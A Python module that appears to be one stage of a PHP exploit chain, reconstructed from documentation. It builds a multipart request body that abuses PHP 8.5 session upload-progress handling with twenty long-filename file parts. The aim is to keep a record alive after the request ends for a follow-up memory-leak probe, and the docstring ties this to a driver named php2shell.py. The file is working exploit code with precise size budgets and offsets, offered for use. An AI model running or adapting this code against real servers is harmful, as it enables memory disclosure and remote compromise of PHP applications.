#!/usr/bin/env python3
"""Module "STOCK": native-output-leak arm body, stock shape.

RECONSTRUCTED from zer061 shape docs + LEAK module spec; NOT the author's original;
per-build semantics marked VERIFIED (mined docs) / INFERRED.

Purpose
    STOCK.arm_body(sid, large_filename_length) builds the multipart body aimed at
    making the php 8.5 session.upload_progress machinery record SURVIVE request
    end ("frozen profile" record) on the author's reference Linux target; the
    reference docs expect the arm exchange to be answered with HTTP 500.
    php2shell.py:185 calls it as STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
    and frames the result with LEAK.request_bytes(..., None, 23, False)
    (no Cookie header, Connection: close, Basic auth user of length 23), so the
    sid travels as the PHPSESSID form field, not in a cookie.

Per-semantics provenance
VERIFIED (mined from the driver + LEAK module + zer061 bundle):
  - Body is multipart ONLY, no HTTP framing: the return value is fed straight
    into LEAK.request_bytes (php2shell.py:186-188).
  - Boundary b"NATIVEOUTPUTEXACT" == LEAK.BOUNDARY (native-output-leak.py:12).
    LEAK.request_bytes hardcodes it into the Content-Type header
    (native-output-leak.py:74), so the body boundary must be LEAK.BOUNDARY or
    the framed request would not parse as multipart.
  - Part grammar: --B CRLF / Content-Disposition: form-data; name="x" CRLF CRLF
    value CRLF (native-output-leak.py:17-22); file parts name="upload<i>" ;
    filename="..." CRLF / Content-Type: application/octet-stream CRLF CRLF X CRLF
    (native-output-leak.py:25-32).
  - Exactly 20 file parts: the max_file_uploads cap (native-output-leak.py:170-171
    "--arm-files ... between 1 and 20", default 20; freeze_battery.py always
    sprays range(20)).
  - Filename strategy: F-repetition b"F" * len; index 0 uses filename length 9,
    every later part uses large_filename_length (native-output-leak.py:41-42).
  - Closing terminator --B-- CRLF (native-output-leak.py:43).
  - The 14-byte frozen-profile disclosure of the follow-up probe is checked at
    LEAK_OFFSET 0x57030 inside a 0x200000 main chunk (LEAK.analyze): the arm
    record that must survive is the profile feeding that probe.
  - Size budget (measured, freeze_battery): post_max_size is 8M on this lab
    stack and a body > 8M aborts pre-machinery; the machinery never engages.
    Budget: 20 * (filename_len + ~140 framing bytes) < 8 * 1024 * 1024.
    With COMPACT.ARM_FILENAME_LENGTH = 262144 the body is ~5.25 MB (< 8M).
INFERRED (no doc statement found; documented for A/B against a real target):
  - The file count is fixed at 20 inside the two-argument signature (the driver
    passes no count); any caller growth stays bounded by MAX_FILE_UPLOADS anyway.
  - No side t[] filler fields in the stock arm body (LEAK.arm_body carries none).
  - Field order PHPSESSID-first mirrors LEAK.arm_body verbatim.
"""

BOUNDARY = b"NATIVEOUTPUTEXACT"
MAX_FILE_UPLOADS = 20          # measured max_file_uploads cap on the lab stack
ARM_FILE_COUNT = MAX_FILE_UPLOADS

# Rough per-part framing bytes (boundary line + CD + Content-Type + empty line +
# terminator CRLFs); used only for the documented 8M budget comment below.
_PART_HEADER_BYTES = 140
POST_MAX_SIZE = 8 * 1024 * 1024


def field(name: bytes, value: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        + value + b"\r\n"
    )


def file_part(index: int, filename: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="upload'
        + str(index).encode()
        + b'"; filename="' + filename + b'"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\nX\r\n"
    )


def arm_body(sid: bytes, large_filename_length: int) -> bytes:
    """Stock frozen-profile arm body (multipart only).

    Shape (VERIFIED mirror of LEAK.arm_body with files == 20):
      1 x PHPSESSID field                          (value: sid)
      1 x PHP_SESSION_UPLOAD_PROGRESS field         (value: b"MMM")
      20 x file parts name="upload<i>"              (F*9, then F*large x19)
      1 x closing --BOUNDARY--\r\n

    Size note (measured lab constraint): keep
        20 * (large_filename_length + ~140) < 8 * 1024 * 1024
    or the request aborts pre-machinery on this stack (body > 8M).
    """
    if large_filename_length < 1:
        raise ValueError("large_filename_length must be positive")
    if MAX_FILE_UPLOADS * (large_filename_length + _PART_HEADER_BYTES) >= POST_MAX_SIZE:
        raise ValueError(
            "arm body would exceed the measured 8M post_max_size budget and "
            "abort pre-machinery; lower large_filename_length"
        )
    parts = [
        field(b"PHPSESSID", sid),
        field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM"),
    ]
    for index in range(ARM_FILE_COUNT):
        filename_length = 9 if index == 0 else large_filename_length
        parts.append(file_part(index, b"F" * filename_length))
    parts.append(b"--" + BOUNDARY + b"--\r\n")
    return b"".join(parts)
